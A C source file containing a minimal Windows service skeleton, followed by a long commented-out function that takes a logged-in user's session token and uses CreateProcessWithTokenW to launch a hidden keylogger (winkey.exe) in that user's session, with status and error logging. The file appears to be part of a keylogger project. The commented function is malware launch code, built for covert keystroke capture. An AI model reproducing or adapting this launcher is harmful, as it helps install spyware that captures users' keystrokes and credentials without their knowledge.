#include <windows.h>
#include <stdio.h>

SERVICE_STATUS_HANDLE g_StatusHandle;
HANDLE g_StopEvent;

VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv);
VOID WINAPI Handler(DWORD control);

int main()
{
    SERVICE_TABLE_ENTRY table[] = {
        { (TCHAR*) "SimpleService", (LPSERVICE_MAIN_FUNCTION) ServiceMain },
        { NULL, NULL }
    };
    
    StartServiceCtrlDispatcher(table);
    return 0;
}

VOID WINAPI ServiceMain(DWORD argc, LPSTR *argv)
{
    g_StatusHandle = RegisterServiceCtrlHandlerA("SimpleService", Handler);
    
    SERVICE_STATUS status = {
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_RUNNING,
        SERVICE_ACCEPT_STOP,
        NO_ERROR,
        0,
        0,
        0
    };
    
    SetServiceStatus(g_StatusHandle, &status);
    
    g_StopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    WaitForSingleObject(g_StopEvent, INFINITE);
    
    status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &status);
    CloseHandle(g_StopEvent);
}

VOID WINAPI Handler(DWORD control)
{
    if (control == SERVICE_CONTROL_STOP) {
        SetEvent(g_StopEvent);
    }
}




// BOOL LaunchKeyloggerInUserSession()
// {
//     SvcReportEvent(TEXT("Attempting to launch keylogger in user session"));
    
//     // Try to get user token
//     HANDLE hUserToken = GetUserTokenViaWTS();
    
//     if (hUserToken) {
//         SvcReportEvent(TEXT("Got user session token, launching keylogger"));
        
//         // Build the keylogger path
//         TCHAR szKeyloggerPath[MAX_PATH];
//         TCHAR szServicePath[MAX_PATH];
        
//         if (!GetModuleFileName(NULL, szServicePath, MAX_PATH)) {
//             SvcReportEvent(TEXT("GetModuleFileName failed"));
//             CloseHandle(hUserToken);
//             return FALSE;
//         }
        
//         // Extract directory from service path
//         TCHAR szServiceDir[MAX_PATH];
//         StringCchCopy(szServiceDir, MAX_PATH, szServicePath);
//         TCHAR* lastBackslash = _tcsrchr(szServiceDir, TEXT('\\'));
//         if (lastBackslash) {
//             *lastBackslash = TEXT('\0');
//         }
        
//         // Build full path to keylogger
//         StringCchPrintf(szKeyloggerPath, MAX_PATH, TEXT("%s\\winkey.exe"), szServiceDir);
        
//         // Check if file exists
//         DWORD dwAttrib = GetFileAttributes(szKeyloggerPath);
//         if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
//             SvcReportEvent(TEXT("Keylogger not found!"));
//             CloseHandle(hUserToken);
//             return FALSE;
//         }
        
//         // Prepare startup info and process info
//         STARTUPINFO si = {0};
//         PROCESS_INFORMATION pi = {0};
//         si.cb = sizeof(si);
        
//         // Launch with user token using CreateProcessWithTokenW
//         BOOL result = CreateProcessWithTokenW(
//             hUserToken,                    // User token
//             LOGON_WITH_PROFILE,            // Logon flags
//             NULL,                          // Application name
//             szKeyloggerPath,               // Command line
//             CREATE_NO_WINDOW,              // Creation flags
//             NULL,                          // Environment
//             NULL,                          // Current directory
//             &si,                           // Startup info
//             &pi                            // Process information
//         );
        
//         CloseHandle(hUserToken);
        
//         if (result) {
//             SvcReportEvent(TEXT("Keylogger launched in user session!"));
            
//             // Store process information
//             gKeyloggerProcessInfo = pi;

//             DWORD exitCode;
//             if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
//                 if (exitCode != STILL_ACTIVE) {
//                     SvcReportEvent(TEXT("Keylogger process exited immediately!"));
//                     return FALSE;
//                 } else {
//                     SvcReportEvent(TEXT("Keylogger process is running"));
//                 }
//             }
            
//             return TRUE;
//         } else {
//             DWORD error = GetLastError();
            
//             // Enhanced error logging
//             TCHAR errorMsg[256];
//             _stprintf_s(errorMsg, _countof(errorMsg), 
//                        TEXT("CreateProcessWithTokenW failed with error: %d"), error);
//             SvcReportEvent(errorMsg);
            
//             if (error == ERROR_PRIVILEGE_NOT_HELD) {
//                 SvcReportEvent(TEXT("Missing SE_IMPERSONATE_NAME privilege"));
//             } else if (error == ERROR_NO_TOKEN) {
//                 SvcReportEvent(TEXT("Invalid token handle"));
//             } else if (error == ERROR_ACCESS_DENIED) {
//                 SvcReportEvent(TEXT("Access denied to token"));
//             } else if (error == ERROR_ELEVATION_REQUIRED) {
//                 SvcReportEvent(TEXT("Elevation required"));
//             } else if (error == ERROR_BAD_EXE_FORMAT) {
//                 SvcReportEvent(TEXT("Bad EXE format - check if winkey.exe is built properly"));
//             }
            
//             return FALSE;
//         }
//     } else {
//         SvcReportEvent(TEXT("Failed to get user session token\n"));
//         return FALSE;
//     }
// }